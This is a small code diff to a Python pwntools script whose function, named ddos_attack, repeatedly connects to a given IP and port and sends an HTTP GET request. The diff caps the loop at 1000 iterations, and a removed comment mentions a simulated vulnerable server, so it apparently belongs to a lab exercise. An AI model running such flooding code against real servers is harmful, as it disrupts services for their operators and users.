@@ -2,10 +2,9 @@ from pwn import *
 
 
 def ddos_attack(ip, port):
-    while 1:
+    for _ in range(1000):
         target = remote(ip, port)
         target.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
-        #print(target.recvuntil(b"Simulated vulnerable server").decode())
         target.close()
 
 if __name__ == "__main__":
